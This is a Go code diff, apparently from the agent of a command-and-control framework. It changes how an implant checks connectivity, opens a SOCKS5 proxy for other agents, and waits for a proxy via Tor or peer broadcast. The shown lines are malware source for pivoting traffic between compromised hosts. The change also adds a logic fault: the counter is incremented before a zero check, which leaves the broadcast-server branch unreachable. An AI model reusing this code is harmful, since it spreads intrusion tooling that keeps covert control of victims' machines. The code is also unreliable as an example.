@@ -197,11 +197,10 @@ func main() {
 	}()
 
 	// do we have internet?
-	checkInternet := func(cnt int) bool {
-		defer func() { cnt++ }()
+	checkInternet := func(cnt *int) bool {
 		if tun.HasInternetAccess() {
 			// if we do, we are feeling helpful
-			if cnt == 0 {
+			if *cnt == 0 {
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
 				go agent.StartBroadcast(true, ctx, cancel)
@@ -209,14 +208,16 @@ func main() {
 			return true
 
 		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(emp3r0r_data.AgentProxy) {
+			*cnt++
 			// we don't, just wait for some other agents to help us
 			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
-			if cnt == 0 {
+			if *cnt == 0 {
 				ctx, cancel := context.WithCancel(context.Background())
 				go func() {
+					log.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
 					err := agent.BroadcastServer(ctx, cancel, "")
 					if err != nil {
-						log.Fatal(err)
+						log.Fatalf("BroadcastServer: %v", err)
 					}
 				}()
 				for ctx.Err() == nil {
@@ -232,7 +233,7 @@ func main() {
 		return true
 	}
 	i := 0
-	for !checkInternet(i) {
+	for !checkInternet(&i) {
 		log.Printf("[%d] Checking Internet connectivity...", i)
 		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
 	}
